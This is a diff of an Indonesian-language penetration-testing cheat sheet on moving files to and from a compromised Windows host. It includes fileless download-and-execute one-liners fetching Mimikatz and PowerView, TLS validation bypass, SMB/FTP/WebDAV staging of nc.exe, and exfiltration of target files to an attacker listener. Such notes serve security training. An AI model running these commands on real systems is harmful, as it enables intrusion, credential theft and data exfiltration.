@@ -1,162 +1,162 @@
-# File Transfer
-
+<h1 align="center">File Transfer</h1>
 <h2 align="center">Windows</h2>
 
 ### Metode 1: copas dari Linux
-
-```
-# cek dulu hash-nya di linux
-md5sum file
-
-# konversi ke base64
-cat file |base64 -w 0;echo
-
-# di windows
-[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("ENCODED-BASE64"))
-
-# pastikan hash-nya sama seperti di awal
-Get-FileHash PATH-FILE -Algorithm md5
-```
+- Cek dulu hash-nya di linux: `md5sum file`
+- Konversi ke base64: `cat file |base64 -w 0;echo`
+- Di windows: `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("ENCODED-BASE64"))`
+- Pastikan hash-nya sama seperti di awal: `Get-FileHash PATH-FILE -Algorithm md5`
 
 ### Metode 2: download file dari sumber online dengan PowerShell
-
+- Metode yg bisa digunakan
+  ```
+  Method	            Description
+  OpenRead	        Returns the data from a resource as a Stream.
+  OpenReadAsync	    Returns the data from a resource without blocking the calling thread.
+  DownloadData	    Downloads data from a resource and returns a Byte array.
+  DownloadDataAsync   Downloads data from a resource and returns a Byte array without blocking the calling thread.
+  DownloadFile	    Downloads data from a resource to a local file.
+  DownloadFileAsync   Downloads data from a resource to a local file without blocking the calling thread.
+  DownloadString	    Downloads a String from a resource and returns a String.
+  DownloadStringAsync Downloads a String from a resource without blocking the calling thread.
+  ```
+- Contoh dengan method DownloadFile
+  ```
+  (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+  (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+  ```
+- Dengan method DownloadString (fileless: langsung eksekusi tanpa simpan)
+  ```
+  IEX (New-Object Net.WebClient).DownloadString('https://<url>/Invoke-Mimikatz.ps1')
+  ```
+- IEX bisa juga untuk pipeline
+  ```
+  (New-Object Net.WebClient).DownloadString('URL-KE-FILE-PS1') | IEX
+  ```
+- Menggunakan Invoke-WebRequest
+  ```
+  Invoke-WebRequest https://<url>/PowerView.ps1 -OutFile PowerView.ps1
+  ```
+#### Mengatasi error jika konfigurasi internet explorer tidak di selesaikan
+Bypass dengan *-UseBasicParsing*
 ```
-# metode yg bisa digunakan
-Method	            Description
-OpenRead	    Returns the data from a resource as a Stream.
-OpenReadAsync	    Returns the data from a resource without blocking the calling thread.
-DownloadData	    Downloads data from a resource and returns a Byte array.
-DownloadDataAsync   Downloads data from a resource and returns a Byte array without blocking the calling thread.
-DownloadFile	    Downloads data from a resource to a local file.
-DownloadFileAsync   Downloads data from a resource to a local file without blocking the calling thread.
-DownloadString	    Downloads a String from a resource and returns a String.
-DownloadStringAsync Downloads a String from a resource without blocking the calling thread.
-
-# contoh dengan method DownloadFile
-(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
-(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
-
-# dengan method DownloadString (fileless: langsung eksekusi tanpa simpan)
-IEX (New-Object Net.WebClient).DownloadString('https://<url>/Invoke-Mimikatz.ps1')
-
-# IEX bisa juga untuk pipeline
-(New-Object Net.WebClient).DownloadString('URL-KE-FILE-PS1') | IEX
-
-# menggunakan Invoke-WebRequest
-Invoke-WebRequest https://<url>/PowerView.ps1 -OutFile PowerView.ps1
-
-# mengatasi error jika konfigurasi internet explorer tidak di selesaikan
-# bypass dengan -UseBasicParsing
 Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
-
-# mengatasi error terkait dengan sertifikat SSL/TLS not trusted
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
+#### Mengatasi error terkait dengan sertifikat SSL/TLS not trusted
+````
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+````
 
 ### Metode 3: SMB download
-
-```
-# server SMB di komputer attacker
-sudo impacket-smbserver share -smb2support /tmp/smbshare
-
-# dari komp target
-copy \\<ip>\share\nc.exe
-
-# versi windows baru memblokir akses yang tidak terautentikasi
-# server SMB di komputer attacker
-sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
-
-# dari komp target
-net use n: \\192.168.220.133\share /user:test test
-copy n:\nc.exe
-```
+- Server SMB di komputer attacker
+  ```
+  sudo impacket-smbserver share -smb2support /tmp/smbshare
+  ```
+- Dari komp target
+  ```
+  copy \\<ip>\share\nc.exe
+  ```
+- Versi windows baru memblokir akses yang tidak terautentikasi
+- Server SMB di komputer attacker:
+  ```
+  sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+  ```
+- Dari komp target
+  ```
+  net use n: \\192.168.220.133\share /user:test test
+  copy n:\nc.exe
+   ```
 
 ### Metode 4: FTP download
+- Install server ftp di komp attacker
+  ```
+  sudo pip3 install pyftpdlib
+  ```
+- Jalankan di port 21 (user anonymous secara default aktif)
+  ```
+  sudo python3 -m pyftpdlib --port 21
+  ```
+- Download dari ftp dg powershell
+  ```
+  (New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\ftp-file.txt')
+  ```
+- Membuat ftp interaktif di komp target:
+  ```
+  C:\batagor> echo open <ip> > ftpcommand.txt
+  C:\batagor> echo USER anonymous >> ftpcommand.txt
+  C:\batagor> echo binary >> ftpcommand.txt
+  C:\batagor> echo GET file.txt >> ftpcommand.txt
+  C:\batagor> echo bye >> ftpcommand.txt
+  C:\batagor> ftp -v -n -s:ftpcommand.txt
+  ftp> open <ip>
+  Log in with USER and PASS first.
+  ftp> USER anonymous
 
-```
-# install server ftp di komp attacker
-sudo pip3 install pyftpdlib
+  ftp> GET file.txt
+  ftp> bye
 
-# jalankan di port 21 (user anonymous secara default aktif)
-sudo python3 -m pyftpdlib --port 21
-
-# download dari ftp dg powershell
-(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\ftp-file.txt')
-
-# membuat ftp interaktif di komp target
-C:\batagor> echo open <ip> > ftpcommand.txt
-C:\batagor> echo USER anonymous >> ftpcommand.txt
-C:\batagor> echo binary >> ftpcommand.txt
-C:\batagor> echo GET file.txt >> ftpcommand.txt
-C:\batagor> echo bye >> ftpcommand.txt
-C:\batagor> ftp -v -n -s:ftpcommand.txt
-ftp> open <ip>
-Log in with USER and PASS first.
-ftp> USER anonymous
-
-ftp> GET file.txt
-ftp> bye
-
-C:\batagor>more file.txt
-Ini isi file contoh
-```
+  C:\batagor>more file.txt
+  Ini isi file contoh
+  ```
 
 ### Metode 5: Upload dg encode Base64 di PowerShell
-
-```
-# di komp target
-[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
-
-# salin hash dan paste di komp attacker (linux)
-echo ENCODED_BASE64 > base64 -d > hosts
-
-# pastikan file sama, verifikasi dg hash
-```
+- Di komp target
+  ```
+  [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+  ```
+- Salin hash dan paste di komp attacker (linux)
+  ```
+  echo ENCODED_BASE64 > base64 -d > hosts
+  ```
+- Pastikan file sama, verifikasi dg hash
 
 ### Metode 6: PowerShell Web Uploads
-
-```
-# di komp attacker
-pip3 install uploadserver
-python3 -m uploadserver
-
-# di komp target (windows)
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-Invoke-FileUpload -Uri http://<ip>:<port>/upload -File C:\Windows\System32\drivers\etc\hosts
-
-## upload dengan format Base64
-# di komp attacker
-nc -lvnp 8000
-
-# di komp target
-$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
-Invoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64
-```
+- Di komp attacker
+  ```
+  pip3 install uploadserver
+  python3 -m uploadserver
+  ```
+- Di komp target (windows)
+  ```
+  IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+  Invoke-FileUpload -Uri http://<ip>:<port>/upload -File C:\Windows\System32\drivers\etc\hosts
+  ```
+- Upload dengan format Base64
+- Di komp attacker
+  ```
+  nc -lvnp 8000
+  ```
+- Di komp target
+  ```
+  $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+  Invoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64
+  ```
 
 ### Metode 7: SMB uploads
-
-```
-# di komp attacker
-sudo pip3 install wsgidav cheroot
-sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
-
-# tes koneksi dari komp target
-dir \\192.168.49.128\DavWWWRoot
-
-# tes upload file dari komp target
-copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
-copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
-```
+- Di komp attacker
+  ```
+  sudo pip3 install wsgidav cheroot
+  sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+  ```
+- Tes koneksi dari komp target
+  ```
+  dir \\192.168.49.128\DavWWWRoot
+  ```
+- Tes upload file dari komp target
+  ```
+  copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+  copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+  ```
 
 ### Metode 7: FTP uploads
-
-```
-# di komp attacker
-sudo python3 -m pyftpdlib --port 21 --write
-
-# di komp target (windows)
-(New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
-```
+- Di komp attacker
+  ```
+  sudo python3 -m pyftpdlib --port 21 --write
+  ```
+- Di komp target (windows)
+  ```
+  (New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+  ```
 
 <h2 align="center">Linux</h2>
 
